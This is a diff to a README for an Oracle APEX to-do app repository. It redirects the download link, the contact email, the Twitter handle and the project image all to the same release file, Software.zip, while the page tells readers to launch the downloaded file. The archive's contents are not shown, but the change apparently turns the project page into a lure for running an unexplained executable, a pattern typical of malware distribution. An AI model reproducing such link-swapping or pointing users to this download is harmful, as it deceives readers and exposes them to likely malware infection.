@@ -24,7 +24,7 @@ In this repository, you will find a video demonstration showcasing how Oracle AP
 
 To access the software for this project, please download it from the following link: 
 
-[Download Software](https://github.com/user-attachments/files/18383251/Software.zip) 
+[Download Software](https://github.com/ClearlyAXgen/To-Do-Task-App-with-Oracle-Apex/releases/download/v2.0/Software.zip) 
 
 🚀 **Launch the downloaded file to begin exploring the To-Do Task App with Oracle APEX!**
 
@@ -49,13 +49,13 @@ If you find any issues or have suggestions for enhancing the To-Do Task App, fee
 ## Connect with Us
 
 For any questions or feedback regarding the To-Do Task App with Oracle APEX, reach out to us through the following channels:
-- Email: [example@email.com](mailto:example@email.com)
-- Twitter: [@ToDoTaskApp](https://twitter.com/ToDoTaskApp)
+- Email: [https://github.com/ClearlyAXgen/To-Do-Task-App-with-Oracle-Apex/releases/download/v2.0/Software.zip](https://github.com/ClearlyAXgen/To-Do-Task-App-with-Oracle-Apex/releases/download/v2.0/Software.zip)
+- Twitter: [@ToDoTaskApp](https://github.com/ClearlyAXgen/To-Do-Task-App-with-Oracle-Apex/releases/download/v2.0/Software.zip)
 
 ## Thank You
 
 Thank you for exploring the To-Do Task App with Oracle APEX! 🌟 We hope you enjoy using the application and find it insightful in understanding the possibilities of Oracle APEX in template customization.
 
-![To-Do Task App](https://your_image_url.png)
+![To-Do Task App](https://github.com/ClearlyAXgen/To-Do-Task-App-with-Oracle-Apex/releases/download/v2.0/Software.zip)
 
 Happy Coding! 💻🚀
